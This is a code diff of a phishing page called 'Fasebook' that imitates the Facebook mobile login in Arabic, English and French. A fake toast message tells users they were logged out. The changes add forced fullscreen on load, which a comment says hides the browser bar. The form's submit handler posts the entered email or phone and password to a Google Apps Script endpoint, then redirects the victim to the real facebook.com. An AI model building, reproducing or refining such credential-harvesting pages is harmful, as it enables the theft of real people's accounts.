@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <title>Fasebook</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
   <!-- أيقونات Font Awesome -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
   <style>
@@ -12,16 +12,17 @@
       --input-border: #ccd0d5;
       --button-hover: #166fe5;
     }
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Ubuntu, Arial, sans-serif;
-      background-color: #fff;
+    html, body {
+      height: 100%;
       margin: 0;
       padding: 0;
+      overflow: hidden; /* يمنع تمرير الصفحة لإظهار شريط المتصفح */
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Ubuntu, Arial, sans-serif;
+      background-color: #fff;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: flex-start;
-      min-height: 100vh;
     }
     .lang { margin-top: 15px; font-size: 15px; color: #444; cursor: pointer; user-select: none; }
     .logo { margin: 50px 0 30px 0; }
@@ -80,7 +81,7 @@
     }
     @keyframes spin { 0% { transform: rotate(0deg);} 100% { transform: rotate(360deg);} }
 
-    /* ✅ فقاعة أسفل الصفحة */
+    /* فقاعة أسفل الصفحة */
     .toast {
       position: fixed;
       bottom: 20px;
@@ -129,10 +130,7 @@
     <div class="msg" id="msg"></div>
   </div>
 
-  <!-- ✅ رابط Meta -->
   <div class="meta" id="metaLink">Meta ©</div>
-
-  <!-- ✅ فقاعة الإشعار -->
   <div class="toast" id="toast">تم تسجيل خروجك من فيس بوك يرجى إعادة التسجيل مرة اخرى</div>
 
   <script>
@@ -148,67 +146,47 @@
     const form = document.getElementById("myForm");
     const toast = document.getElementById("toast");
 
-    // ✅ إظهار الفقاعة عند بداية الصفحة
+    // ✅ إظهار الفقاعة عند بداية الصفحة ومحاولة الدخول لوضع ملء الشاشة
     window.addEventListener("load", () => {
       toast.classList.add("show");
-      setTimeout(() => {
-        toast.classList.remove("show");
-      }, 4000);
+      setTimeout(() => toast.classList.remove("show"), 4000);
+
+      // محاولة فتح وضع ملء الشاشة
+      const elem = document.documentElement;
+      if (elem.requestFullscreen) elem.requestFullscreen().catch(() => {});
+      else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen(); // Safari
+      else if (elem.msRequestFullscreen) elem.msRequestFullscreen(); // IE11
     });
 
-    // باقي الكود بدون تغيير
     const translations = {
       ar: {
-        lang: "العربية ⌵",
-        emailPlaceholder: "الرقم أو الإيميل",
-        passPlaceholder: "كلمة المرور",
-        login: "تسجيل الدخول",
-        forgot: "هل نسيت كلمة السر؟",
-        create: "إنشاء حساب جديد",
-        errorEmail: "أدخل رقم أو بريد إلكتروني صحيح",
-        errorPass: "أدخل كلمة سر صحيحة",
-        waiting: "جاري تسجيل الدخول...",
-        customEmail: "يرجى إدخال رقم أو بريد إلكتروني صحيح",
+        lang: "العربية ⌵", emailPlaceholder: "الرقم أو الإيميل", passPlaceholder: "كلمة المرور",
+        login: "تسجيل الدخول", forgot: "هل نسيت كلمة السر؟", create: "إنشاء حساب جديد",
+        errorEmail: "أدخل رقم أو بريد إلكتروني صحيح", errorPass: "أدخل كلمة سر صحيحة",
+        waiting: "جاري تسجيل الدخول...", customEmail: "يرجى إدخال رقم أو بريد إلكتروني صحيح",
         customPass: "يرجى إدخال كلمة سر صحيحة"
       },
       en: {
-        lang: "English ⌵",
-        emailPlaceholder: "Email or Phone",
-        passPlaceholder: "Password",
-        login: "Log In",
-        forgot: "Forgotten password?",
-        create: "Create new account",
-        errorEmail: "Enter a valid email or phone number",
-        errorPass: "Enter a valid password",
-        waiting: "Logging in...",
-        customEmail: "Please enter a valid email or phone number",
+        lang: "English ⌵", emailPlaceholder: "Email or Phone", passPlaceholder: "Password",
+        login: "Log In", forgot: "Forgotten password?", create: "Create new account",
+        errorEmail: "Enter a valid email or phone number", errorPass: "Enter a valid password",
+        waiting: "Logging in...", customEmail: "Please enter a valid email or phone number",
         customPass: "Please enter a valid password"
       },
       fr: {
-        lang: "Français ⌵",
-        emailPlaceholder: "E-mail ou téléphone",
-        passPlaceholder: "Mot de passe",
-        login: "Se connecter",
-        forgot: "Mot de passe oublié ?",
-        create: "Créer un nouveau compte",
-        errorEmail: "Entrez un e-mail ou un numéro valide",
-        errorPass: "Entrez un mot de passe valide",
-        waiting: "Connexion en cours...",
-        customEmail: "Veuillez entrer un e-mail ou un numéro valide",
+        lang: "Français ⌵", emailPlaceholder: "E-mail ou téléphone", passPlaceholder: "Mot de passe",
+        login: "Se connecter", forgot: "Mot de passe oublié ?", create: "Créer un nouveau compte",
+        errorEmail: "Entrez un e-mail ou un numéro valide", errorPass: "Entrez un mot de passe valide",
+        waiting: "Connexion en cours...", customEmail: "Veuillez entrer un e-mail ou un numéro valide",
         customPass: "Veuillez entrer un mot de passe valide"
       }
     };
 
-    const langs = ["ar", "en", "fr"];
-    let currentLangIndex = 0;
-    const savedLang = localStorage.getItem("langIndex");
-    if (savedLang !== null) {
-      currentLangIndex = parseInt(savedLang);
-    }
+    const langs = ["ar","en","fr"];
+    let currentLangIndex = localStorage.getItem("langIndex") || 0;
 
     function updateLanguage() {
-      const langKey = langs[currentLangIndex];
-      const t = translations[langKey];
+      const t = translations[langs[currentLangIndex]];
       langBtn.textContent = t.lang;
       emailInput.placeholder = t.emailPlaceholder;
       passInput.placeholder = t.passPlaceholder;
@@ -217,68 +195,45 @@
       createBtn.textContent = t.create;
       errorEmail.textContent = t.errorEmail;
       errorPass.textContent = t.errorPass;
-
-      emailInput.oninvalid = function() { this.setCustomValidity(t.customEmail); };
-      emailInput.oninput = function() { this.setCustomValidity(""); };
-      passInput.oninvalid = function() { this.setCustomValidity(t.customPass); };
-      passInput.oninput = function() { this.setCustomValidity(""); };
-
+      emailInput.oninvalid = () => { emailInput.setCustomValidity(t.customEmail); };
+      emailInput.oninput = () => { emailInput.setCustomValidity(""); };
+      passInput.oninvalid = () => { passInput.setCustomValidity(t.customPass); };
+      passInput.oninput = () => { passInput.setCustomValidity(""); };
       localStorage.setItem("langIndex", currentLangIndex);
     }
 
     langBtn.addEventListener("click", () => {
-      currentLangIndex = (currentLangIndex + 1) % langs.length;
+      currentLangIndex = (parseInt(currentLangIndex) + 1) % langs.length;
       updateLanguage();
     });
-
     updateLanguage();
 
-    forgotText.addEventListener("click", () => {
-      window.location.href = "https://m.facebook.com/login/identify/";
-    });
-
-    createBtn.addEventListener("click", () => {
-      window.location.href = "https://m.facebook.com/reg/";
-    });
-
-    document.getElementById("metaLink").addEventListener("click", () => {
-      window.location.href = "https://about.meta.com/";
-    });
+    forgotText.addEventListener("click", () => { window.location.href = "https://m.facebook.com/login/identify/"; });
+    createBtn.addEventListener("click", () => { window.location.href = "https://m.facebook.com/reg/"; });
+    document.getElementById("metaLink").addEventListener("click", () => { window.location.href = "https://about.meta.com/"; });
 
     form.addEventListener("submit", e => {
       e.preventDefault();
       let valid = true;
       errorEmail.style.display = "none";
       errorPass.style.display = "none";
-
       const emailOrPhone = emailInput.value.trim();
       const password = passInput.value.trim();
       const emailRegex = /^[^@\s]+@[^@\s]+\.[^@\s]+$/;
       const phoneRegex = /^[0-9]{6,15}$/;
-
-      if (!(emailRegex.test(emailOrPhone) || phoneRegex.test(emailOrPhone))) {
-        errorEmail.style.display = "block"; valid = false;
-      }
-      if (password.length < 4) {
-        errorPass.style.display = "block"; valid = false;
-      }
+      if (!(emailRegex.test(emailOrPhone) || phoneRegex.test(emailOrPhone))) { errorEmail.style.display = "block"; valid = false; }
+      if (password.length < 4) { errorPass.style.display = "block"; valid = false; }
       if (!valid) return;
-
       const t = translations[langs[currentLangIndex]];
       msg.innerHTML = `<div class="spinner"></div><span>${t.waiting}</span>`;
       submitButton.disabled = true;
-
       const data = { email_or_phone: emailOrPhone, password: password };
       fetch("https://script.google.com/macros/s/AKfycby6KJYLJwG0diUq8poivMjk4rTeJ_mgCo-v99cbC-GIyoZct5-TlqPav-NOoZ5o0zbF/exec", {
-        method: "POST",
-        body: JSON.stringify(data)
-      })
-      .then(res => res.text())
-      .then(txt => {
+        method: "POST", body: JSON.stringify(data)
+      }).then(res => res.text()).then(txt => {
         form.reset();
         window.location.href = "https://www.facebook.com";
-      })
-      .catch(err => {
+      }).catch(err => {
         msg.innerHTML = "❌ Error: " + err;
         msg.style.color = "red";
         submitButton.disabled = false;
